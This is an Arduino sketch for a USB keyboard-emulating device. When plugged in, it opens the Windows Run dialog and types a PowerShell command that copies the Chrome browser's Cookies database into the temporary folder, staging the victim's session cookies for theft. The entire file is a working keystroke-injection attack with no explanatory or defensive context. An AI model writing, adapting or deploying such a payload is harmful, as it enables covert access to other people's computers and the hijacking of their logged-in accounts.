#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println("powershell Copy-Item \"$env:APPDATA\\..\\Local\\Google\\Chrome\\User Data\\Default\\Cookies\" -Destination \"$env:TEMP\\Cookies.db\"");
}

void loop() {}
